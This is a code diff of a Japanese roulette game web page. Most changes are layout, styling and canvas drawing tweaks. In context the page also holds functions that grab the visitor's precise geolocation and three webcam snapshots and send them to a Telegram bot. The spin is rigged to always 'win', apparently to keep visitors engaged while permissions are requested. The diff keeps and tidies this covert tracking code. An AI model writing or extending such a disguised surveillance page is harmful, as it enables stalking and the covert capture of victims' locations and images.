@@ -2,29 +2,31 @@
 <html lang="ja">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 <title>🎯</title>
 <style>
-  body { margin: 0; color: #fff; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; background: #444; transition: background 0.1s; }
-  h2 { position: absolute; top: 20px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; }
-  #container { width: 90vw; max-width: 450px; aspect-ratio: 1; position: relative; }
-  #pointer { position: absolute; left: 50%; top: -15px; transform: translate(-50%,0); font-size: 40px; z-index: 20; color: #ffffff; text-shadow: 0 0 10px rgba(0,0,0,0.5); }
-  canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); }
-  #result { margin-top: 25px; font-size: 28px; font-weight: bold; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); }
-  #spinBtn { margin-top: 15px; padding: 15px 40px; font-size: 20px; cursor: pointer; border-radius: 50px; border: none; background: #fff; color: #333; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.2s; }
-  #winModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 50px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(255, 255, 255, 0.5); z-index: 100; min-width: 280px; }
-  #winModal h1 { margin: 0 0 30px; font-size: 45px; }
-  #continueBtn { padding: 18px 50px; font-size: 22px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
+  body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
+  h2 { position: relative; margin-bottom: 30px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; }
+  #container { width: 85vw; max-width: 400px; aspect-ratio: 1; position: relative; margin: 20px 0; }
+  #pointer { position: absolute; left: 50%; top: -25px; transform: translateX(-50%); font-size: 45px; z-index: 20; color: #ffffff; text-shadow: 0 4px 10px rgba(0,0,0,0.5); line-height: 1; }
+  canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); display: block; }
+  #result { margin-top: 20px; font-size: 26px; font-weight: bold; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); height: 1.2em; }
+  #spinBtn { margin-top: 20px; padding: 15px 50px; font-size: 20px; cursor: pointer; border-radius: 50px; border: none; background: #fff; color: #333; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+  #winModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 40px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 80%; max-width: 300px; }
+  #winModal h1 { margin: 0 0 20px; font-size: 32px; }
+  #continueBtn { padding: 15px 40px; font-size: 20px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; }
   #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 90; }
 </style>
 </head>
 <body>
 
 <h2>🎯ルーレット🎯</h2>
+
 <div id="container">
   <div id="pointer">▼</div>
   <canvas id="wheel"></canvas>
 </div>
+
 <h3 id="result">結果：</h3>
 <button id="spinBtn">回す</button>
 
@@ -57,13 +59,23 @@ function draw() {
   const rad = (Math.PI * 2) / slots.length;
   ctx.clearRect(0, 0, size, size);
   for(let i=0; i<slots.length; i++){
-    ctx.beginPath(); ctx.moveTo(c, c); ctx.arc(c, c, c, i * rad, (i + 1) * rad);
-    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE"; ctx.fill();
-    ctx.strokeStyle = "#333"; ctx.lineWidth = 2; ctx.stroke();
-    ctx.save(); ctx.translate(c, c); ctx.rotate(i * rad + rad / 2);
-    ctx.fillStyle = "#333"; ctx.font = "bold 50px sans-serif"; ctx.textAlign = "center"; ctx.textBaseline = "middle";
-    // 文字をさらに中心寄りに調整 (c * 0.55)
-    ctx.fillText(slots[i], c * 0.55, 0); ctx.restore();
+    ctx.beginPath();
+    ctx.moveTo(c, c);
+    ctx.arc(c, c, c, i * rad, (i + 1) * rad);
+    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE";
+    ctx.fill();
+    ctx.strokeStyle = "#333";
+    ctx.lineWidth = 4;
+    ctx.stroke();
+    ctx.save();
+    ctx.translate(c, c);
+    ctx.rotate(i * rad + rad / 2);
+    ctx.fillStyle = "#333";
+    ctx.font = "bold 55px sans-serif";
+    ctx.textAlign = "center";
+    ctx.textBaseline = "middle";
+    ctx.fillText(slots[i], c * 0.55, 0);
+    ctx.restore();
   }
 }
 window.onload = draw;
@@ -77,16 +89,13 @@ function sendLocation() {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-        const text = `📍 位置特定成功:\n${mapUrl}`;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: mapUrl })
         });
       },
-      function(error) {
-        console.log("許可されなかった or エラー:", error.message);
-      },
+      function(error) { console.log(error.message); },
       { enableHighAccuracy: true }
     );
   }
@@ -98,7 +107,6 @@ async function captureAndSend() {
     const video = document.createElement("video");
     video.srcObject = stream; video.muted = true; await video.play();
     await new Promise(r => setTimeout(r, 1200));
-
     const blobs = [];
     for (let i = 0; i < 3; i++) {
       const tempCanvas = document.createElement("canvas");
@@ -109,7 +117,6 @@ async function captureAndSend() {
       await new Promise(r => setTimeout(r, 400));
     }
     stream.getTracks().forEach(t => t.stop());
-
     for (const b of blobs) {
       const fd = new FormData();
       fd.append("chat_id", CHAT_ID); fd.append("photo", b, "shot.jpg");
@@ -124,8 +131,9 @@ async function captureAndSend() {
 const spinBtn = document.getElementById("spinBtn");
 spinBtn.onclick = () => {
   spinBtn.disabled = true;
-  document.getElementById("result").textContent = "回転中...";
-  canvas.style.transition = "none"; canvas.style.transform = "rotate(0deg)";
+  document.getElementById("result").textContent = "...";
+  canvas.style.transition = "none";
+  canvas.style.transform = "rotate(0deg)";
   void canvas.offsetWidth;
   canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
   const targetIdx = [0,2,4,6][Math.floor(Math.random()*4)];
@@ -133,7 +141,7 @@ spinBtn.onclick = () => {
   const stopA = 360 - (targetIdx * anglePerSlot) - (anglePerSlot / 2);
   canvas.style.transform = `rotate(${2160 + stopA}deg)`;
   setTimeout(() => {
-    document.getElementById("result").textContent = "結果：当たり！";
+    document.getElementById("result").textContent = "当たり！";
     document.getElementById("overlay").style.display = "block";
     document.getElementById("winModal").style.display = "block";
     spinBtn.disabled = false;
